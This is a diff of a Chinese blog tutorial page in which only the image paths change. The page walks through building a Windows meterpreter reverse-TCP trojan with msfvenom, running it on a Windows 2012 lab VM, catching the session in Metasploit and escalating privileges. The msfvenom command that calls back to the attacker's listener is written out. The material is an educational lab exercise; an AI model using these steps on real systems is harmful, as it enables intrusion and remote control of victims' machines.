@@ -464,24 +464,24 @@
 <p>windows 2012：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">msdn.各种操作系统镜像</a></p>
 <p>![38732ac418889e8a8cb279313b3abf7](C:\Program Files\6\图片\38732ac418889e8a8cb279313b3abf7.png)</p>
 <p>shell中输入：msfvenom –help看看参数配置，这个是生成木马的编译器。</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/a78a330f0bd4bdfe679ebb81dc87cf8.png" alt="a78a330f0bd4bdfe679ebb81dc87cf8"></p>
+<p><img src="/a78a330f0bd4bdfe679ebb81dc87cf8.png" alt="a78a330f0bd4bdfe679ebb81dc87cf8"></p>
 <p>shell输入：ifconfig（看看IP地址）</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/1293a049911ab7dbb1e0ff690742d8a.png" alt="1293a049911ab7dbb1e0ff690742d8a"></p>
+<p><img src="/1293a049911ab7dbb1e0ff690742d8a.png" alt="1293a049911ab7dbb1e0ff690742d8a"></p>
 <p>shell输入：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f exe &gt; jinitaimei.exe</p>
 <p>（这个命令意思就是通过msfvenom编译器编译一个后门软件，通俗的讲就是生成一个木马。-p 就是对应的端口 LHOST：这个是本地监听地址这就是我们kali地址。监听端口号就是4444 -f ：指定生成一个什么文件 exe：可执行文件  最后生成一个jinitaimei的exe可执行文件 。可以看出生成了一个341字节木马文件）</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/e54d629aca6b7c53539c8db7f8e61b0.png" alt="e54d629aca6b7c53539c8db7f8e61b0"></p>
+<p><img src="/e54d629aca6b7c53539c8db7f8e61b0.png" alt="e54d629aca6b7c53539c8db7f8e61b0"></p>
 <p>我们直接把文件拖到物理机上，然后在物理机中复制到windows 2012系统中</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/Users\Administrator\Desktop\图片\055cb6f098d31ecaf3d7b41ed77df20.png![055cb6f098d31ecaf3d7b41ed77df20](/055cb6f098d31ecaf3d7b41ed77df20.png" alt="055cb6f098d31ecaf3d7b41ed77df20"></p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/e783d86ad4f309774463257d1e4880a.png" alt="e783d86ad4f309774463257d1e4880a"></p>
+<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/Users\Administrator\Desktop\图片\055cb6f098d31ecaf3d7b41ed77df20.png![055cb6f098d31ecaf3d7b41ed77df20](/055cb6f098d31ecaf3d7b41ed77df20.png" alt="055cb6f098d31ecaf3d7b41ed77df20"></p>
+<p><img src="/e783d86ad4f309774463257d1e4880a.png" alt="e783d86ad4f309774463257d1e4880a"></p>
 <p>kali命令行中输入：msfconsole（可以看到metasploit版本号，攻击模块和辅助模块以及有多少个漏洞我们可以利用等等，我们话不多说，直接开始淦）</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/6de28a69f4c6402628eb6bef4b60a2d.png" alt="6de28a69f4c6402628eb6bef4b60a2d"></p>
+<p><img src="/6de28a69f4c6402628eb6bef4b60a2d.png" alt="6de28a69f4c6402628eb6bef4b60a2d"></p>
 <p>我们直接利用监听模块：</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/03a057d2af7d08a481442feab29fd62.png" alt="03a057d2af7d08a481442feab29fd62"></p>
+<p><img src="/03a057d2af7d08a481442feab29fd62.png" alt="03a057d2af7d08a481442feab29fd62"></p>
 <p>现在直接去windows 2012 双击运行一下这边就会回弹一个meterpreter回来</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/83ed59241e6b7290e1c84165537c66b.png" alt="83ed59241e6b7290e1c84165537c66b"></p>
+<p><img src="/83ed59241e6b7290e1c84165537c66b.png" alt="83ed59241e6b7290e1c84165537c66b"></p>
 <p>看看我们现在的权限，直接提权到最高权限。</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200808160441571.png" alt="image-20200808160441571"></p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/83ed59241e6b7290e1c84165537c66b.png" alt="83ed59241e6b7290e1c84165537c66b"></p>
+<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200808160441571.png" alt="image-20200808160441571"></p>
+<p><img src="/83ed59241e6b7290e1c84165537c66b.png" alt="83ed59241e6b7290e1c84165537c66b"></p>
 <h2 id="ok现在可以直接看肉鸡的windows-2012-电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）"><a href="#ok现在可以直接看肉鸡的windows-2012-电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）" class="headerlink" title="ok现在可以直接看肉鸡的windows 2012 电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）"></a>ok现在可以直接看肉鸡的windows 2012 电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）</h2>
             </div>
             <hr/>
